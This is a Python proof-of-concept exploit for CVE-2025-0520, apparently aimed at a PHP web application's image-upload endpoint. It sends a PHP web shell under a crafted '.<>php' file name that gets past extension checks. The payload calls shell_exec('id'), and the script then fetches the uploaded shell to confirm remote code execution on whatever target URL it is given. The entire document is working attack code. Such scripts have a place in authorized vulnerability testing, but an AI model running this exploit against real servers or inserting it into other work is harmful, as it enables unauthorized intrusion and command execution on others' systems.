#!/usr/bin/env python3
import requests
import sys
import random
import string
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def exploit(target_url):
    filename = random_string() + ".<>php"
    php_content = "<?php echo 'CVE-2025-0520-VULN'; echo shell_exec('id'); ?>"
    
    upload_path = "/index.php?s=/home/page/uploadImg"
    url = urljoin(target_url, upload_path)
    
    boundary = "----WebKitFormBoundary" + random_string(16)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }
    
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="editormd-image-file"; filename="{filename}"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        f"{php_content}\r\n"
        f"--{boundary}--\r\n"
    )
    
    try:
        print(f"[*] Target: {target_url}")
        print(f"[*] Uploading malicious PHP file...")
        
        resp = requests.post(url, headers=headers, data=body, timeout=10, verify=False)
        
        if resp.status_code == 200 and "success" in resp.text:
            result = resp.json()
            webshell_url = result.get("url", "")
            
            if webshell_url:
                if not webshell_url.startswith("http"):
                    webshell_url = urljoin(target_url, webshell_url)
                
                print(f"[+] Upload success!")
                print(f"[+] Webshell URL: {webshell_url}")
                
                verify_resp = requests.get(webshell_url, timeout=10, verify=False)
                
                if "CVE-2025-0520-VULN" in verify_resp.text:
                    print(f"[+] RCE verified! Response:")
                    print(verify_resp.text)
                    return True, webshell_url
                else:
                    print(f"[-] Upload succeeded but RCE verification failed")
                    return False, webshell_url
            else:
                print(f"[-] Upload response missing URL")
                return False, None
        else:
            print(f"[-] Upload failed: {resp.status_code}")
            print(f"[-] Response: {resp.text[:200]}")
            return False, None
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False, None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8081")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip("/")
    success, shell_url = exploit(target_url)
    
    if success:
        print("\n[+] Vulnerability confirmed: CVE-2025-0520")
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
